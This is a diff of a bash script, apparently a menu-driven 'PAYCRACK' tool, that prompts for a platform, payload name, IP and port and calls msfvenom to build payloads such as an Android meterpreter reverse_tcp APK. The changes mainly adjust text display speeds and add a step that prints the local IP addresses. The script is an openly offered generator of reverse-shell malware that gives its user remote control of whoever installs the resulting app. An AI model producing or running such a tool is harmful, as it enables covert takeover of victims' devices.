@@ -2,7 +2,7 @@ apt install pv
 clear
 echo " 
 █▀█ ▄▀█ █▄█ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀█
-█▀▀ █▀█ ░█░ █▄▄ █▀▄ █▀█ █▄▄ █░█ █▄█ " | pv -qL 90
+█▀▀ █▀█ ░█░ █▄▄ █▀▄ █▀█ █▄▄ █░█ █▄█ " | pv -qL 99
 echo 
 echo "[1] android" 
 echo 
@@ -17,12 +17,17 @@ echo
 read -p "Choose from options >> " choose 
 echo 
 read -p "Type the name of your payload >> " name
+echo 
+echo "Your ip(ips)" |pv -qL 30
+echo "--------------------"| pv -qL 30 
+ifconfig | grep -w inet |grep -v "127"|awk '{ print $2}'|pv -qL 30 
+echo "--------------------" |pv -qL 30 
 echo  
-read -p "Type your local host >> " ip
+read -p "Type your ip >> " ip
 echo 
 read -p "Type your local port >> " port 
 echo 
-echo "Waiting................." | pv -qL 5
+echo "Waiting................." | pv -qL 30
 if [ $choose -eq 1 ]
 then 
 	msfvenom -p android/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.apk
@@ -65,6 +70,6 @@ fi
 
 echo "===============================" | pv -qL 30
 echo 
-echo "Created by Yousef El-Halafawy" | pv -qL 15
+echo "Created by Yousef El-Halafawy" | pv -qL 30
 echo
 echo "===============================" | pv -qL 30
